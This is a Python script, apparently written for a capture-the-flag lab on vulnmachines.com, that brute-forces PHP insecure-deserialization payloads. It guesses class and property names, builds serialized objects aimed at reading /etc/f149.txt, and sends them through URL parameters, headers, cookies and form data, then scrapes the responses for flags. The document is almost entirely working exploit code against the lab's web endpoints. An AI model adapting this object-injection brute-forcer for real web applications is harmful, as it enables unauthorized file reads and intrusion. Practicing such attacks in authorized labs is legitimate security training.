#!/usr/bin/env python3
import requests
import urllib.parse
import re

base_url = "http://hackme11.vulnmachines.com:8056"

# DEBE ser una clase con __destruct o __wakeup
# Los nombres más probables en un CTF educativo son:
probable_names = [
    # El más obvio para un tutorial
    'FileReader', 'Filereader', 'filereader',
    'ReadFile', 'Readfile', 'readfile',
    'FileHandler', 'Filehandler', 'filehandler',
    'File', 'file',
    
    # Nombres de ejemplo típicos
    'Example', 'example',
    'Demo', 'demo', 
    'Test', 'test',
    'Sample', 'sample',
    'Tutorial', 'tutorial',
    
    # Nombres basados en vulnerabilidad
    'Vulnerable', 'vulnerable',
    'Vuln', 'vuln',
    'Exploit', 'exploit',
    'Injection', 'injection',
    
    # Nombres del lab
    'Lab', 'lab',
    'Lab1', 'lab1',
    'Challenge', 'challenge',
    
    # Nombres cortos comunes en CTF
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
    'AA', 'BB', 'CC', 'DD', 'EE', 'FF', 'GG', 'HH',
    'Foo', 'foo', 'Bar', 'bar', 'Baz', 'baz',
    
    # Basado en el artículo
    'Logger', 'logger',
    'Debug', 'debug',
    'Debugger', 'debugger',
    
    # Más específicos
    'ObjectHandler', 'objecthandler',
    'SerializeHandler', 'serializehandler',
    'UnserializeHandler', 'unserializehandler',
    
    # Basados en el nombre del sitio
    'VulnMachines', 'Vulnmachines', 'vulnmachines',
    'SecOps', 'Secops', 'secops',
    'TheSecOps', 'Thesecops', 'thesecops',
    
    # Intentar con el nombre del parámetro
    'vnm', 'VNM', 'Vnm',
    
    # Nombres de métodos mágicos como clases
    'Destruct', 'destruct',
    'Wakeup', 'wakeup',
    'ToString', 'toString',
    'Magic', 'magic',
    
    # Intentar nombres muy simples que podrían pasar desapercibidos
    'X', 'Y', 'Z',
    'x', 'y', 'z',
    '1', '2', '3',
]

# Las propiedades más comunes
properties = ['file', 'filename', 'path', 'f']

print(f"[*] FINAL ATTEMPT - Testing {len(probable_names)} most probable class names")

for cls in probable_names:
    for prop in properties:
        payload = f'O:{len(cls)}:"{cls}":1:{{s:{len(prop)}:"{prop}";s:13:"/etc/f149.txt";}}'
        encoded = urllib.parse.quote(payload)
        url = f"{base_url}/params?vnm={encoded}"
        
        try:
            response = requests.get(url, timeout=2)
            
            # Buscar cualquier signo de éxito
            if 'vulnmachines{' in response.text.lower():
                print(f"\n[!!!] FINALLY! FLAG FOUND!")
                print(f"[!!!] Class: {cls}")
                print(f"[!!!] Property: {prop}")
                matches = re.findall(r'vulnmachines\{[^}]+\}', response.text, re.IGNORECASE)
                if matches:
                    print(f"[!!!] FLAG: {matches[0]}")
                    
                    # Probar en todos los labs
                    print("\n[*] Testing same class on other labs...")
                    
                    # Lab 2
                    headers = {'x-vnm': payload}
                    r2 = requests.get("http://hackme11.vulnmachines.com:8071/headers", headers=headers)
                    if 'vulnmachines{' in r2.text.lower():
                        m2 = re.findall(r'vulnmachines\{[^}]+\}', r2.text, re.IGNORECASE)
                        if m2:
                            print(f"[!!!] Lab 2 FLAG: {m2[0]}")
                    
                    # Lab 3
                    payload3 = f'O:{len(cls)}:"{cls}":1:{{s:{len(prop)}:"{prop}";s:13:"/tmp/f149.txt";}}'
                    encoded3 = urllib.parse.quote(payload3)
                    headers3 = {'Cookie': f'vnm={encoded3}'}
                    r3 = requests.get("http://hackme11.vulnmachines.com:8073/cookies", headers=headers3)
                    if 'vulnmachines{' in r3.text.lower():
                        m3 = re.findall(r'vulnmachines\{[^}]+\}', r3.text, re.IGNORECASE)
                        if m3:
                            print(f"[!!!] Lab 3 FLAG: {m3[0]}")
                    
                    # Lab 4
                    data4 = {'payload': payload3}
                    r4 = requests.put("http://hackme11.vulnmachines.com:8073/forms", data=data4)
                    if 'vulnmachines{' in r4.text.lower():
                        m4 = re.findall(r'vulnmachines\{[^}]+\}', r4.text, re.IGNORECASE)
                        if m4:
                            print(f"[!!!] Lab 4 FLAG: {m4[0]}")
                    
                    exit(0)
                    
        except:
            pass

print("\n[-] Still no flag found. The class name must be very specific.")